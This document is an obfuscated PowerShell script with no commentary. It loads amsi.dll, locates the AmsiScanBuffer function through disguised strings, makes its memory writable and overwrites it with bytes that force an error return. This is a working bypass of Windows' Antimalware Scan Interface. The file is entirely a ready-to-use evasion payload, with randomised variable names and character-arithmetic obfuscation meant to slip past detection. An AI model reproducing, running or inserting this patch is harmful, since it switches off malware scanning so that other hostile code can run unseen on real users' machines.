$EpDQYLJJ6NKME1CcX3qI = @"
using System;
using System.Runtime.InteropServices;
public class EpDQYLJJ6NKME1CcX3qI {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr _YwYxM73xYgdfKGzA, string H_9WcvId);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr AVUMU1XmvYkj, UIntPtr kwZamytNWTIGboHQxBC6, uint gRYKn1GF_kkdi, out uint tRtz1BG7r3);
}
"@

Add-Type $EpDQYLJJ6NKME1CcX3qI

$Nu1DucRDekyHa8N0GMeK = [EpDQYLJJ6NKME1CcX3qI]::LoadLibrary("$([chAR](97+88-88)+[CHaR]([bYTE]0x6d)+[ChAR](115*61/61)+[CHAR]([Byte]0x69)+[chAr]([byTe]0x2e)+[cHAr](100)+[chAR]([byTe]0x6c)+[cHar]([BYTe]0x6c))")
$yZsGek9fLQl = [EpDQYLJJ6NKME1CcX3qI]::GetProcAddress($Nu1DucRDekyHa8N0GMeK, "$(('ÁmsîScàn'+'Búffér').nOrMAlIZE([ChAr](70*5/5)+[CHar]([bYte]0x6f)+[cHar](114)+[CHaR]([BYte]0x6d)+[chAr]([bYtE]0x44)) -replace [CHAr](92)+[CHAR]([bYte]0x70)+[cHAR](123*27/27)+[cHar]([byTe]0x4d)+[cHaR]([bytE]0x6e)+[chAr]([byte]0x7d))")
$p = 0
[EpDQYLJJ6NKME1CcX3qI]::VirtualProtect($yZsGek9fLQl, [uint32]5, 0x40, [ref]$p)
$Ob4 = "0xB8"
$r_y = "0x57"
$A98wvGj8 = "0x00"
$YHOueZN = "0x07"
$vXhRrfAedb9FJ = "0x80"
$jG7AC6qV5h = "0xC3"
$bktg1tT43UyHdUap2xm8 = [Byte[]] ($Ob4,$r_y,$A98wvGj8,$YHOueZN,+$vXhRrfAedb9FJ,+$jG7AC6qV5h)
[System.Runtime.InteropServices.Marshal]::Copy($bktg1tT43UyHdUap2xm8, 0, $yZsGek9fLQl, 6)